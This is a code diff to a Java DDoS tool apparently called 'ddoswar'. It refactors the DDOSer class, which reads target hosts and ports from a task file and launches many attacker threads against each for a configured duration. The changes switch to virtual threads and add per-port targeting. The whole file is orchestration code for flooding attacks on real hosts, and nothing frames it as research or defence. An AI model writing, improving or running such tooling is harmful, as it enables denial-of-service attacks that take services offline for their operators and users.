@@ -2,16 +2,13 @@ package ua.cc.lajdev.ddoswar;
 
 import ua.cc.lajdev.ddoswar.utils.FileParser;
 
-import java.io.BufferedReader;
-import java.io.FileReader;
-import java.io.IOException;
 import java.text.SimpleDateFormat;
-import java.util.Date;
+import java.time.LocalDateTime;
 import java.util.List;
+import java.util.Map;
 import java.util.Properties;
-import java.util.Scanner;
+import java.util.concurrent.ExecutorService;
 import java.util.concurrent.Executors;
-import java.util.concurrent.ScheduledExecutorService;
 import java.util.concurrent.TimeUnit;
 
 /**
@@ -24,7 +21,7 @@ public class DDOSer {
      * This is is the threadpool for all the DDOS-Attack threads.
      * Every attacking thread will be saved in there.
      */
-    private ScheduledExecutorService threadPool;
+    private ExecutorService threadPool;
 
     /**
      * Pattern for the DDOS.
@@ -42,53 +39,46 @@ public class DDOSer {
      * false = threads shouldn´t stop
      * true = threads should stop
      */
-    public static boolean stopThread = false;
+    public boolean stopThread = false;
 
     /**
      * This thread checks
      */
     private TimeChecker timeChecker;
 
+    private static Properties properties;
+
+    static {
+        properties = FileParser.parseProperties();
+    }
+
     private String hostName;
+    private int port;
 
     /**
      * Creates new form ua.cc.lajdev.ddoswar.DDOSer
+     *
+     * @param hostName
+     * @param port
      */
-    public DDOSer() {
-        startAll();
-    }
-
-    public DDOSer(String hostName) {
+    public DDOSer(String hostName, int port) {
         this.hostName = hostName;
+        this.port = port;
         startAll();
     }
 
-    private int createPattern() {
-        try (Scanner reader = new Scanner(new FileReader("conf/ddos.properties"))) {
-            Properties properties = new Properties();
-            while (reader.hasNextLine()) {
-                String[] trim = reader.nextLine().split("=");
-                properties.setProperty(trim[0].trim(), trim[1].trim());
-            }
-
-            ddosPattern = new DDOSPattern();
-            ddosPattern.setHost(hostName);
-            ddosPattern.setProtocol(properties.getProperty("protocol"));
-            ddosPattern.setPort(Integer.parseInt(properties.getProperty("port")));
-            int threads = Integer.parseInt(properties.getProperty("threads"));
-            ddosPattern.setThreads(threads);
-            ddosPattern.setMessage(properties.getProperty("message"));
-            ddosPattern.setHours(Integer.parseInt(properties.getProperty("hours")));
-            ddosPattern.setMinutes(Integer.parseInt(properties.getProperty("minutes")));
-            ddosPattern.setSeconds(Integer.parseInt(properties.getProperty("seconds")));
-            ddosPattern.setTimeout(Integer.parseInt(properties.getProperty("timeout")));
-            ddosPattern.setSocketTimeout(Integer.parseInt(properties.getProperty("socketTimeout")));
-
-            return threads;
-        } catch (IOException e) {
-            System.out.println(e.getCause());
-        }
-        return 0;
+    private void createPattern() {
+        ddosPattern = new DDOSPattern();
+        ddosPattern.setHost(hostName);
+        ddosPattern.setProtocol(properties.getProperty("protocol"));
+        ddosPattern.setPort(port);
+        ddosPattern.setThreads(Integer.parseInt(properties.getProperty("threads")));
+        ddosPattern.setMessage(properties.getProperty("message"));
+        ddosPattern.setHours(Integer.parseInt(properties.getProperty("hours")));
+        ddosPattern.setMinutes(Integer.parseInt(properties.getProperty("minutes")));
+        ddosPattern.setSeconds(Integer.parseInt(properties.getProperty("seconds")));
+        ddosPattern.setTimeout(Integer.parseInt(properties.getProperty("timeout")));
+        ddosPattern.setSocketTimeout(Integer.parseInt(properties.getProperty("socketTimeout")));
     }
 
     /**
@@ -98,9 +88,8 @@ public class DDOSer {
      * @param message
      */
     public static void appendToConsole(String message) {
-        Date date = new Date(System.currentTimeMillis());
-        SimpleDateFormat dateFormat = new SimpleDateFormat("dd.MM.yyyy HH:mm:ss");
-        StringBuilder sb = new StringBuilder(dateFormat.format(date));
+        LocalDateTime date = LocalDateTime.now();
+        StringBuilder sb = new StringBuilder(date.toString());
         sb.append(" ").append(message).append("\n");
         System.out.println(sb);
     }
@@ -110,16 +99,16 @@ public class DDOSer {
      */
     private void startAll() {
         stopThread = false;
-        int threads = createPattern();
+        createPattern();
         duration = (ddosPattern.getHours() * 3600) + (ddosPattern.getMinutes() * 60) + (ddosPattern.getSeconds());
         if (duration > 0) {
-            threadPool = Executors.newScheduledThreadPool(threads);
-            timeChecker = new TimeChecker();
-            timeChecker.start();
+            threadPool = Executors.newVirtualThreadPerTaskExecutor();
             for (int i = 0; i < ddosPattern.getThreads(); i++) {
                 // add a new attacker thread to the threadpool
-                threadPool.scheduleWithFixedDelay(DdosFactory.createDDOS(ddosPattern), 1, ddosPattern.getTimeout(), TimeUnit.MILLISECONDS);
+                threadPool.submit(DdosFactory.createDDOS(ddosPattern, this));
             }
+            timeChecker = new TimeChecker();
+            timeChecker.start();
         } else {
             System.out.println("Time must be greater than 0 seconds!");
         }
@@ -147,15 +136,14 @@ public class DDOSer {
                     duration -= 1;
                     Thread.sleep(1000);
                 } catch (InterruptedException ex) {
-                    interrupt();
-                    stopThread = true;
+//                    interrupt();
+//                    stopThread = true;
                     duration = 0;
-                    ex.printStackTrace();
+                    System.out.println("TimeChecker Stopped.");
                     break;
                 }
             }
             stopAll();
-            System.out.println("Stopped.");
         }
     }
 
@@ -163,10 +151,13 @@ public class DDOSer {
      * @param args the command line arguments
      */
     public static void main(String args[]) {
-        List<String> hostNames = FileParser.parse("conf/task.txt");
+        Map<String, List<Integer>> hostNames = FileParser.parseTask("conf/task.txt");
+
         System.out.println("Attacking.");
-        for (String s : hostNames) {
-            new DDOSer(s);
+        for (String hostName : hostNames.keySet()) {
+            for (int port : hostNames.get(hostName)) {
+                new DDOSer(hostName, port);
+            }
         }
     }
 }
